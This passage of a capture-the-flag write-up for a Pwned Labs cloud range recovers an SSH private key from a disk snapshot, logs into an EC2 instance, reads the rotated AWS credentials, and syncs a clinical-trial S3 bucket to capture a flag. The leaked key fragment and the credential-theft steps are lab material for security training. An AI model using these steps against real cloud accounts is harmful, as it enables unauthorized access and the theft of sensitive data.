 5BGlIv9N/Acz5zDnj630ZAVvNr7K0fgR3UhJY0UfvvxXyyRsN7xRzeqFU/iA2z/L3jnPh8
 YdNakMUTweUJsXOo4rmKY+FbJnneLn+f1wPmGJ34g0s4cWokkN3bqXapapv1Md5DJ1AAAA
 wQCobwjERuVka7pPZfLsGDiCVyaeaMLrdvFPWhSlKfqagROmHlqPEURGSVhFSlA3NhCtFm
 D5ODPaEK21WFYwwXMlPpMFVpPErBdt0DMqX81MXnowGbs04ZBt1XNC0kIt1B/cvDkXBBzz
 pyOwplUOQ/sG3IlPakrl2ZM3Kq5RrK2qNqP9nmPjtt/rw7ks7aOhB8R1Ohgnu089FGJ7rj
 Nm9S5nCjCQtmTrpnuY/WzmfZ6TGCOdlvMhI7CGQxk4YpeXsqcAAADBAM3jTbBkWor2XIu0
 opDXWCmF2t7BPZfR4CG8ViDW9T6t7iP1fvbp1qZ+9iifzZO/jg/s1r3krh8NjtdWofJYJw
 glifGagxA6cCkpzCkEO/jZx6aXhG39odoCL8VDVKLeUhP4ORXCcddO6F0H4592Vb4Ycm55
 xo4EZiKoAZWOFQM3j4/flgcLWeTdpgIhWb0GTFxRJxxBgMS68CNuU4A3NwWRKLFeJGruDL
 2SELg7NGwSaEe4SzOg/0AuTZ7JYxm/pwAAAMEA3f1+WFbf6k/G4xkEzwaKGmFP58S9U65Y
 TgC6DjGZoq58iF6veWx1NrADInSEvpPrs9pjy+eGTsJEMfQTtmn9vpWJRTo93X6s2OYxXQ
 ANRp/pZ+6PDsxWQbO5bkEIEsufG+cIifRq9lev98J7fa/Esm7bTxnBUMItjY9xJlu5rv5c
 tmID/8LG3URGH+KoMjhZFYNtMErdGZl+vGWaDdLUFpg7IfdaKQwNED1le/QvDo8Ev0X2zf
 sOZvGfJCRosNZfAAAAFm5hY2VyQGlwLTE3Mi0zMS05MC0yMjkBAgME
 -----END OPENSSH PRIVATE KEY-----
```

Interesting crontab rotating AWS keys for Nacer which means above AWS keys have already been rotated.. 

```
><fs> cat /var/spool/cron/crontabs/root
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.ZDDw4H/crontab installed on Sat Feb  3 23:28:11 2024)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
0 1 * * * chattr -i /home/nacer/.aws/credentials ; AWS_ACCESS_KEY_ID=$(cat /home/nacer/.aws/credentials | grep aws_access_key_id | awk -F" " '{ print $3 }') ; aws iam delete-access-key --access-key-id $AWS_ACCESS_KEY_ID --user-name nacer@massive-pharma.com ; aws iam create-access-key --user-name nacer@massive-pharma.com | jq -r '"[default]\naws_access_key_id = " + .AccessKey.AccessKeyId + "\naws_secret_access_key = " + .AccessKey.SecretAccessKey' > /home/nacer/.aws/credentials ; chmod 600 /home/nacer/.aws/credentials ; chown nacer:nacer /home/nacer/.aws/credentials ; chattr +i /home/nacer/.aws/credentials
*/2 * * * * rm /home/nacer/.azure/commands/*
```
## EC2 Instance Compromise

Lets get more info on the VM we have an image of to connect to it with the SSH key. 

Got the internal IP from the snapshot so we should be able to determine which instance the SSH keys belong to.

```
<fs> cat /etc/hostname
ip-172-31-90-229
```

Lets correlate this IP with the AWS Instances to determine which machine this is.
 
 ![EC2](/assets/img/instanceip.png)

 Here we can see this is the `web-prod` instance.

 Lets see if the SSH key is still valid and try connecting to the public IP. 

First we need to change the permissions on the nacer_ssh.pem file with `chmod 600 nacer_ssh.pem`

```console
┌──(kali㉿kali)-[~/Desktop/thunderdome]
└─$ sudo chmod 600 nacer_ssh.pem
```

Now we can try connecting using the certificate. 

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -i nacer_ssh.pem nacer@44.208.228.94

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.5.0-1021-aws x86_64)

- Documentation: [https://help.ubuntu.com](https://help.ubuntu.com/)
- Management: [https://landscape.canonical.com](https://landscape.canonical.com/)
- Support: https://ubuntu.com/pro

System information as of Wed Oct  9 18:17:55 UTC 2024

System load:  0.0               Processes:             101
Usage of /:   79.0% of 7.57GB   Users logged in:       0
Memory usage: 29%               IPv4 address for eth0: 172.31.90.229
Swap usage:   0%

- Ubuntu Pro delivers the most comprehensive open source security and
compliance features.
    
    https://ubuntu.com/aws/pro
    

Expanded Security Maintenance for Applications is not enabled.

52 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

New release '24.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

- ** System restart required ***

---

- NOTICE: AWS KEYS ARE SET TO ROTATE DAILY *

---

Last login: Tue Oct  1 21:03:01 2024 from 52.25.247.188
nacer@ip-172-31-90-229:~$
```

And its a success!
We can see the "Notice" message indicating that the AWS keys are rotated daily as we saw during our enumeration of the cron jobs. 

Lets grab the newly rotated keys and run further enumeration. 

```console
nacer@ip-172-31-90-229:~$ cat .aws/credentials
[default]
aws_access_key_id = AKIATCKANV3QGNIRX***
aws_secret_access_key = 5SsPMd6AvU75JyNtopBHI7pRjI+5CgFF5tTe3***
nacer@ip-172-31-90-229:~$
```

## Enumeration with Nacer user

Lets setup these new keys to further enumerate as Nacer with `aws configure --profile nacer`

```console
┌──(kali㉿kali)-[~]
└─$ aws configure --profile nacer

AWS Access Key ID [None]: AKIATCKANV3QGNIRX***
AWS Secret Access Key [None]: 5SsPMd6AvU75JyNtopBHI7pRjI+5CgFF5tTe3***
Default region name [None]:
Default output format [None]:
```

We can confirm the keys are valid with `aws sts get-caller-identity --profile nacer`

And we get below which confirms the keys are valid!

```json
{
"UserId": "AIDATCKANV3QGSTWVUBO5",
"Account": "211125382880",
"Arn": "arn:aws:iam::211125382880:user/nacer@massive-pharma.com"
}
```

Running Cloudfox as the new user did not retrieve anything new and i decided to look back on all the previosuly gathered info we have already acquired and remember the s3 bucket `mp-clinical-trial-data`. Lets see if we can list the contents of the bucket with `aws s3 ls s3://mp-clinical-trial-data --profile nacer`. 

And we get the listing of content in the bucket!

```console
┌──(kali㉿kali)-[~]
└─$ aws s3 ls s3://mp-clinical-trial-data/ --profile nacer
PRE admin-temp/
PRE private/
PRE website-registrations/
```

Lets sync the bucket to our local machine to comb through the content with ease. We can do this with `aws s3 sync s3://mp-clinical-trial-data/ . --profile nacer`. 

After syncing the file we can cd into the private directory to get our next flag!

```console
┌──(kali㉿kali)-[~]
└─$ cd private

┌──(kali㉿kali)-[~/private]
└─$ ls
exp3252-trial-data-export.csv  flag.txt

┌──(kali㉿kali)-[~/private]
└─$ cat flag.txt
57df667c984cb4daae83ff99beee07cc
```

Looking further into the bucket we see OpenEMR being used. This might be usefull in future flags. 

```console
┌──(kali㉿kali)-[~]
└─$ cd admin-temp

┌──(kali㉿kali)-[~/admin-temp]
└─$ ls
openemr-5.0.2.tar.gz
```

And that concludes the "Pulled from the sky" flag from the Thunderdome Cyber Range hosted by the great people at [Pwned Labs](https://pwnedlabs.io/).